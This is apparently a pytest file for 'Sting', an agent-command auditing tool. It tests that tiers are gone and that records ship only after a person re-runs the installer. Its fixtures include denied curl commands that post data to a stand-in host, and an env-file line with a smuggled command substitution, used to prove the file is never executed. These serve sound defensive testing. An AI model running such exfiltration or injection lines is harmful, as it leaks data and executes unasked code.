"""There are no tiers any more, and a machine never sends more than it agreed to.

Decided 27 Sep 2026: every record ships as one thing, whole and masked. So the
installer stops offering tiers, `--tier` says in one line that they are gone,
and the shipper ignores `STING_TIER`. The rule that replaces the tier's promise:

    NEVER SEND MORE THAN A MACHINE AGREED TO WITHOUT A PERSON RE-RUNNING
    install.py AND SEEING WHAT SHIPS.

The mechanism: the installer writes `STING_SHIPS='masked'` into `~/.sting/env`
only after printing what ships, and the shipper sends records only when that
file holds it. Every machine installed before this — whatever its tier, `full`
included — holds its records on disk until a reinstall.

⚠ NOTHING HERE TOUCHES THE REAL MACHINE, WHATEVER THE CODE UNDER TEST DOES.
HOME is the test's own (conftest), the install prefix is a temp dir, the agent
is stubbed into the temp home, preflight is stubbed, and every POST goes to a
fake. `launchctl` and `systemctl` are fakes on a temp PATH, and `service._run`
refuses any command that does not resolve to one of them. And every install
here passes `--no-supervisor`, the `--tier` refusal `--dry-run` too: run
against a tree that does NOT refuse `--tier`, the install it falls into writes
nothing and registers nothing. (A first draft left those out; run against main
it installed into its temp prefix and registered a launchd job, which was
booted out by hand. That is why all three guards are here.)
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess as sp
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

import install                                                     # noqa: E402
from core import audit_log, wire                                   # noqa: E402
from installer import messages, recorded                           # noqa: E402
from shipper import client, config, run, service                   # noqa: E402

pytestmark = pytest.mark.skipif(os.name == "nt", reason="POSIX fake supervisor")

# A supervisor that holds nothing: `print` says not loaded, `show` says inactive.
_FAKE_SUPERVISOR = """#!{python}
import os, sys
from pathlib import Path
with Path(os.environ["FAKE_SUPERVISOR_LOG"]).open("a") as out:
    out.write(" ".join([Path(sys.argv[0]).name] + sys.argv[1:]) + "\\n")
if sys.argv[1:2] == ["print"]:
    sys.exit(113)
if "show" in sys.argv:
    print("LoadState=not-found")
    print("ActiveState=inactive")
    print("MainPID=0")
"""


@pytest.fixture(autouse=True)
def no_real_supervisor(tmp_path, monkeypatch):
    """Fake `launchctl` and `systemctl` first on PATH, and `service._run`
    refusing anything that is not one of them (the harness of
    tests/test_a_settings_change_reaches_the_running_shipper.py)."""
    fakes = tmp_path / "fakebin"
    fakes.mkdir()
    for name in ("launchctl", "systemctl"):
        tool = fakes / name
        tool.write_text(_FAKE_SUPERVISOR.format(python=sys.executable), encoding="utf-8")
        tool.chmod(0o700)
    monkeypatch.setenv("FAKE_SUPERVISOR_LOG", str(tmp_path / "supervisor.log"))
    monkeypatch.setenv("PATH", f"{fakes}{os.pathsep}{os.environ.get('PATH', '')}")
    real_run = service._run

    def only_the_fakes(command, timeout=20):
        resolved = shutil.which(command[0])
        assert resolved and Path(resolved).parent == fakes, (
            f"{command[0]} resolves to {resolved}, not a fake: refusing to run it")
        return real_run(command, timeout)

    monkeypatch.setattr(service, "_run", only_the_fakes)


# ═══════════════════════════════════════════ the installer

@pytest.fixture
def home(tmp_path, monkeypatch):
    """The temp-home install harness tests/test_declared_roots_are_checked.py
    uses: the agent stubbed into the temp home, only preflight stubbed."""
    home = tmp_path / "home"
    (home / ".claude").mkdir(parents=True, exist_ok=True)
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))
    monkeypatch.setenv("STING_INSTALL_ROOT", str(home / "prefix"))
    env_file = home / ".sting" / "env"
    monkeypatch.setattr(install, "ENV_FILE", env_file)
    monkeypatch.setattr(recorded, "ENV_FILE", env_file)
    config_file = home / ".claude" / "settings.json"
    monkeypatch.setattr(install, "choose_agents", lambda requested: [
        {"agent": "claude-code", "evidence": "stubbed",
         "config": str(config_file), "user_level": True}])
    real_run = sp.run

    def only_preflight(cmd, *a, **k):
        if any("preflight" in str(part) for part in (cmd or [])):
            return sp.CompletedProcess(cmd, 0)
        return real_run(cmd, *a, **k)

    monkeypatch.setattr(install.subprocess, "run", only_preflight)
    monkeypatch.setattr(install.console, "make_output_safe", lambda: None)
    return home


SAFE = ["--yes", "--no-collector", "--no-supervisor", "--agent", "claude-code",
        "--scratch", ""]


def _install(*flags) -> int:
    return install.main([*SAFE, *flags])


def _env(home) -> dict:
    return recorded.read(home / ".sting" / "env")


def test_tier_says_in_one_line_that_tiers_are_gone(home, capsys):
    for value in ("full", "verdict_reason_location", "bogus"):
        assert install.main(["--tier", value, "--dry-run", *SAFE]) == 2, value
        out = capsys.readouterr().out.strip()
        assert out == messages.TIERS_ARE_GONE and "\n" not in out, out
        assert "tiers are gone" in out or "no tiers" in out
    assert not (home / ".sting" / "env").exists(), "nothing was installed"
    assert not (home / "prefix").exists()


def test_the_install_prints_what_ships_and_its_limit(home, capsys):
    assert _install("--dry-run") == 0
    out = capsys.readouterr().out
    section = out.split("5 · What leaves this machine", 1)[1].split("6 · Install", 1)[0]
    for line in messages.what_ships():
        assert line in section, line
    assert "every value Sting recognises replaced by its type" in " ".join(
        section.split())
    assert "leaves AS WRITTEN" in section and "a person's" in section
    assert "--tier" not in out, "the installer offers no tier"


def test_the_install_writes_the_agreement_and_no_tier(home, capsys):
    assert _install() == 0
    values = _env(home)
    assert values.get("STING_SHIPS") == wire.MASKED
    assert "STING_TIER" not in values
    settings = config.from_env(env_file=home / ".sting" / "env")
    assert settings.what_ships()["agreed"] is True


@pytest.mark.parametrize("before", ["verdict_reason_location", "verdict",
                                    "verdict_reason_evidence", "bogus"])
def test_a_machine_that_agreed_to_less_is_told_it_now_sends_more(home, capsys, before):
    """A LOCATED machine sent no command text. The reinstall that makes it send
    masked commands says so, once, where the person reads what ships."""
    env = home / ".sting" / "env"
    env.parent.mkdir(parents=True, exist_ok=True)
    env.write_text(f"export STING_TIER='{before}'\n", encoding="utf-8")
    assert _install() == 0
    out = capsys.readouterr().out
    section = out.split("5 · What leaves this machine", 1)[1].split("6 · Install", 1)[0]
    assert "THIS SENDS MORE THAN YOUR LAST INSTALL AGREED TO" in section
    assert repr(before) in section and "dropped    STING_TIER" in section
    assert out.count("SENDS MORE THAN YOUR LAST INSTALL") == 1, "said once"
    assert "STING_TIER" not in _env(home), "and the file no longer carries it"
    capsys.readouterr()
    assert _install() == 0
    again = capsys.readouterr().out
    assert "SENDS MORE" not in again and "dropped    STING_TIER" not in again, (
        "the next install has nothing to say about a tier")


def test_a_full_machine_is_told_it_now_sends_less(home, capsys):
    env = home / ".sting" / "env"
    env.parent.mkdir(parents=True, exist_ok=True)
    env.write_text("export STING_TIER='full'\n", encoding="utf-8")
    assert _install() == 0
    out = capsys.readouterr().out
    assert "less than before" in out and "SENDS MORE" not in out
    assert _env(home).get("STING_SHIPS") == wire.MASKED


def test_a_shell_tier_is_named_as_ignored(home, capsys, monkeypatch):
    monkeypatch.setenv("STING_TIER", "full")
    assert _install("--dry-run") == 0
    assert "STING_TIER='full' in this shell: tiers are gone" in capsys.readouterr().out


def test_status_says_what_ships_and_names_a_tier_nothing_reads(home, capsys):
    env = home / ".sting" / "env"
    env.parent.mkdir(parents=True, exist_ok=True)
    env.write_text("export STING_TIER='verdict_reason_location'\n", encoding="utf-8")
    assert install.main(["--status"]) == 0
    out = capsys.readouterr().out
    assert "ships      ⚠ NOTHING YET" in out
    assert "STING_TIER='verdict_reason_location'" in out and "tiers are gone" in out
    assert "--tier" not in out, "the carried list offers no tier flag"
    env.write_text("export STING_SHIPS='masked'\n", encoding="utf-8")
    assert install.main(["--status"]) == 0
    out = capsys.readouterr().out
    assert "ships      masked records" in out and "NOTHING YET" not in out


def test_the_tier_is_neither_carried_nor_offered():
    assert "STING_TIER" not in recorded.CARRIED
    assert "STING_SHIPS" in recorded.NEVER_CARRIED, (
        "an agreement carried from a run nobody read is no agreement")


# ═══════════════════════════════════════════ the shipper

def _settings(tmp_path, env_lines: str, monkeypatch, **environ) -> config.Settings:
    env_file = tmp_path / "env"
    env_file.write_text("# written by install.py\n"
                        "export STING_COLLECTOR_URL='https://collector.example.invalid'\n"
                        "export STING_DEVICE_ID='laptop-1'\n"
                        "export STING_DEVICE_TOKEN='tok-tok-tok-tok'\n"
                        + env_lines, encoding="utf-8")
    monkeypatch.setenv("STING_POLICY_CACHE", str(tmp_path / "org_policy.json"))
    base = {"HOME": str(tmp_path), "STING_SESSION_ROOT": str(tmp_path / "logs"),
            "STING_SHIPPER_STATE": str(tmp_path / "state"),
            "STING_SHIP_RECORDS": "1", **environ}
    return config.from_env(env=base, env_file=env_file)


def _log(tmp_path) -> Path:
    root = tmp_path / "logs"
    for i in range(3):
        audit_log.append("sess-held", audit_log.build_body(
            "sess-held", seq=i + 1, event="decision", decision="DENY", kind="EXEC",
            rule_id="secret_exact:network_egress", agent="claude-code",
            ts=1_786_000_000.0 + i, command=f"curl -d x=1 https://x.invalid # {i}"),
            root=root)
    return audit_log.default_log_path("sess-held", root)


def _posts(monkeypatch) -> list[str]:
    urls: list[str] = []

    def fake_post(url, token, payload, timeout=None):
        urls.append(url)
        count = len(json.loads(payload).get("records", []))
        return client.Outcome(client.STORED, 200, {"records_stored": count,
                                                   "records_deduplicated": 0})

    monkeypatch.setattr(run.client, "post", fake_post)
    monkeypatch.setattr(run.client, "get",
                        lambda url, token, timeout=None: client.Outcome(client.UNSUPPORTED, 404))
    return urls


@pytest.mark.parametrize("tier", ["verdict_reason_location", "verdict",
                                  "verdict_reason_evidence", "full"])
def test_a_machine_without_the_agreement_sends_no_record(tmp_path, monkeypatch, tier):
    """⚠ THE RULE. A machine that agreed to LOCATED must not start sending
    masked commands silently, and neither must any other: a `full` machine's
    masked records are less than it agreed to, and the reinstall is still where
    a person sees what ships. Records wait on disk, nothing is pruned, and it
    is said once."""
    settings = _settings(tmp_path, f"export STING_TIER='{tier}'\n", monkeypatch)
    log = _log(tmp_path)
    before = log.read_bytes()
    urls = _posts(monkeypatch)
    said: list[str] = []
    shipper = run.Shipper(settings, now=lambda: 1.0, log=said.append)
    for _ in range(3):
        result = shipper.tick()
    assert not [u for u in urls if u.endswith("/v1/batches")], "no record left"
    assert result["skipped"].startswith("held:")
    assert shipper.pending() == 3 and log.read_bytes() == before
    held = [line for line in said if "NOT SENDING RECORDS" in line]
    assert len(held) == 1, said


def test_the_agreement_ships_and_an_export_is_no_agreement(tmp_path, monkeypatch):
    urls = _posts(monkeypatch)
    _log(tmp_path)
    exported = _settings(tmp_path, "", monkeypatch, STING_SHIPS="masked")
    assert exported.what_ships()["agreed"] is False, (
        "an export is not an agreement: only the file install.py wrote is")
    run.Shipper(exported, now=lambda: 1.0, log=lambda *a: None).tick()
    assert not [u for u in urls if u.endswith("/v1/batches")]
    agreed = _settings(tmp_path, "export STING_SHIPS='masked'\n", monkeypatch)
    run.Shipper(agreed, now=lambda: 1.0, log=lambda *a: None).tick()
    assert [u for u in urls if u.endswith("/v1/batches")], "the agreement ships"


def test_a_tier_is_ignored_and_named_once_at_start(tmp_path, monkeypatch):
    settings = _settings(tmp_path, "export STING_SHIPS='masked'\n"
                         "export STING_TIER='verdict'\n", monkeypatch,
                         STING_TIER="FULL")
    said: list[str] = []
    run.Shipper(settings, log=said.append).announce_what_ships()
    text = "\n".join(said)
    assert "ships    masked records" in text
    assert text.count("tiers are gone") == 2
    assert "STING_TIER='verdict'" in text and "STING_TIER='FULL'" in text
    for bogus in ("bogus", "FULL", "verdict_reason_location "):
        quiet = _settings(tmp_path, "export STING_SHIPS='masked'\n", monkeypatch,
                          STING_TIER=bogus)
        run.Shipper(quiet, log=lambda *a: None)       # a tier never kills it


def test_status_json_says_what_ships(tmp_path, monkeypatch, capsys):
    settings = _settings(tmp_path, "export STING_TIER='verdict'\n", monkeypatch)
    monkeypatch.setattr(run.config, "from_env", lambda: settings)
    assert run.main(["--status"]) == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload["ships"] == config.HELD
    assert payload["what_ships"]["agreed"] is False
    assert payload["what_ships"]["ignored"] == [
        {"setting": "STING_TIER", "value": "verdict", "where": str(tmp_path / "env")}]
    assert "tier" not in payload and "tier_provenance" not in payload


def test_the_heartbeat_says_what_this_machine_ships(tmp_path, monkeypatch):
    from shipper.cursor import Cursor
    from shipper.heartbeat import Heartbeat
    for lines, ships in (("export STING_SHIPS='masked'\n", wire.MASKED),
                         ("export STING_TIER='full'\n", config.HELD)):
        settings = _settings(tmp_path, lines, monkeypatch, STING_TIER="bogus")
        beat = Heartbeat(settings, Cursor(tmp_path / "cursor.json"))
        assert beat.payload()["tier"] == ships


def test_make_batch_builds_what_ships_and_refuses_a_tier(tmp_path, capsys):
    from tools import make_batch
    log = _log(tmp_path)
    assert make_batch.main(["build", str(log), "--device", "d", "--tier", "full"]) == 2
    assert "--tier is gone" in capsys.readouterr().err
    out = tmp_path / "batch.json"
    # Keyed with the laptop's key, which make_batch reads and never makes
    # (tests/test_fingerprints_are_keyed.py): none in this home yet, then one.
    assert make_batch.main(["build", str(log), "--device", "d", "--out", str(out)]) == 2
    assert "no fingerprint key" in capsys.readouterr().err
    from shipper import fingerprint_key
    fingerprint_key.create_if_missing(fingerprint_key.path_under(Path.home()))
    assert make_batch.main(["build", str(log), "--device", "d", "--out", str(out)]) == 0
    batch = json.loads(out.read_text(encoding="utf-8"))
    assert batch["tier"] == wire.MASKED
    assert wire.verify_batch(batch)["content"] == "verified"


# ═══════════════════════════════════════════ old exports read as before

def test_every_old_tier_is_still_a_batch_this_verifier_reads():
    assert set(wire.TIERS) == {"full", "verdict_reason_evidence",
                               "verdict_reason_location", "verdict"}
    assert set(wire.SHAPES) == set(wire.TIERS) | {wire.MASKED}


# ═══════════════════════════════════════════ reading the settings

def test_the_env_file_is_parsed_and_never_executed(tmp_path):
    """It is `export KEY='value'`, written by install.py, and sourcing it would
    mean running whatever a later editor put in it."""
    path = tmp_path / "env"
    path.write_text("export STING_SHIPS='masked'\n"
                     "export EVIL=$(touch /tmp/sting-should-not-exist)\n",
                     encoding="utf-8")
    assert config.read_env_file(path)["STING_SHIPS"] == wire.MASKED
    assert config.from_env(env={"HOME": str(tmp_path)}, env_file=path).what_ships()[
        "agreed"] is True
    assert not Path("/tmp/sting-should-not-exist").exists()


def test_a_missing_env_file_is_not_an_error_and_holds(tmp_path):
    """No file, no agreement: a machine that never ran install.py ships
    nothing, and says why, rather than raising."""
    settings = config.from_env(env={"HOME": str(tmp_path), "STING_TIER": "full"},
                               env_file=tmp_path / "absent")
    what = settings.what_ships()
    assert what["agreed"] is False and what["ships"] == config.HELD
    assert "re-run install.py" in what["detail"]


def test_a_bad_interval_is_still_its_own_error(tmp_path):
    """⚠ A TYPO IN ANOTHER SETTING KEEPS ITS OWN ERROR. `from_env()` `int()`s
    STING_SHIP_INTERVAL, and nothing about tiers may be said for it."""
    with pytest.raises(ValueError, match="invalid literal"):
        config.from_env(env={"HOME": str(tmp_path), "STING_TIER": "full",
                             "STING_SHIP_INTERVAL": "not-a-number"},
                        env_file=tmp_path / "absent")


def test_preflight_builds_its_probe_masked_whatever_sting_tier_says(monkeypatch,
                                                                    capsys):
    """Preflight's round trip builds a real record and posts it, through the
    same masking every batch takes. A shell `STING_TIER` of any spelling is
    read by nothing (it used to abort preflight with a traceback)."""
    sys.path.insert(0, str(ROOT / "tools"))
    import preflight
    sent: list[dict] = []

    def fake_post(url, token, payload, *, timeout=30.0):
        sent.append(json.loads(payload))
        return client.Outcome(client.STORED, 200, {"batch_ref": "b1",
                                                   "records_stored": 1})

    monkeypatch.setattr(client, "post", fake_post)
    monkeypatch.setenv("STING_COLLECTOR_URL", "https://collector.example.invalid")
    monkeypatch.setenv("STING_DEVICE_TOKEN", "tok-tok-tok-tok")
    monkeypatch.setenv("STING_DEVICE_ID", "laptop-1")
    monkeypatch.setenv("STING_TIER", "bogus")
    monkeypatch.delenv("STING_COLLECTOR_READER_TOKEN", raising=False)
    env = Path(os.environ["HOME"]) / ".sting" / "env"       # the test's own HOME
    env.parent.mkdir(parents=True, exist_ok=True)
    env.write_text("export STING_SHIPS='masked'\n", encoding="utf-8")
    from shipper import fingerprint_key                  # the install made one
    fingerprint_key.create_if_missing(env.parent / fingerprint_key.FILE_NAME)
    preflight.check_reaches_collector()
    out = capsys.readouterr().out
    assert "Traceback" not in out and "[PASS]" in out, out
    assert len(sent) == 1
    batch = sent[0]
    assert batch["tier"] == wire.MASKED and batch["purpose"] == wire.PREFLIGHT
    assert wire.verify_batch(batch)["content"] == "verified"


def test_preflight_posts_nothing_from_a_machine_that_never_agreed(monkeypatch, capsys):
    """Security review: the round trip is a second path that posts a batch, so
    it asks the one question the shipper asks first. (Its record is a fixed
    probe, not the developer's data; the rule is the rule.)"""
    sys.path.insert(0, str(ROOT / "tools"))
    import preflight
    sent: list = []
    monkeypatch.setattr(client, "post", lambda *a, **k: sent.append(a))
    monkeypatch.setenv("STING_COLLECTOR_URL", "https://collector.example.invalid")
    monkeypatch.setenv("STING_DEVICE_TOKEN", "tok-tok-tok-tok")
    monkeypatch.setenv("STING_DEVICE_ID", "laptop-1")
    preflight.check_reaches_collector()
    out = capsys.readouterr().out
    assert not sent, "a machine without the agreement posted a batch"
    assert "has not agreed" in out and "re-run install.py" in out
